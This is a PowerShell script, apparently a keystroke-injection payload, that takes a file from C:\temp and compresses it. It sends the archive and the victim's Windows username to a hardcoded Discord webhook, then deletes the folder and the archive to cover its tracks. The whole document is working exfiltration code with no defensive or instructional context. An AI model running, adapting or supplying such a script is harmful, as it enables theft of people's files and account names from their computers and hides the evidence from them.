$hookurl='https://discord.com/api/webhooks/1180337343920615434/dPohBhRKx_M_MeRIEQQjdOsPTydHKpwg_Vt6nOJU2ZeREXnDfQXV08laAiP2I45nQLBj'
$fileSaveDir = 'C:\temp'
$date = get-date
$filename = 'j'
$filepath = Get-ChildItem -Path "$fileSaveDir" -Filter "$filename" -Recurse | % {$_.FullName}
Compress-Archive -Path $fileSaveDir\j.txt -DestinationPath c:\export.zip -Force
$Body = @{'username' = $env:username; 'content' = "Obiwan: Hello there!"}
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json); curl.exe -F 'file1=@c:\export.zip' $hookurl
rm -r C:\temp
rm -r C:\export.zip
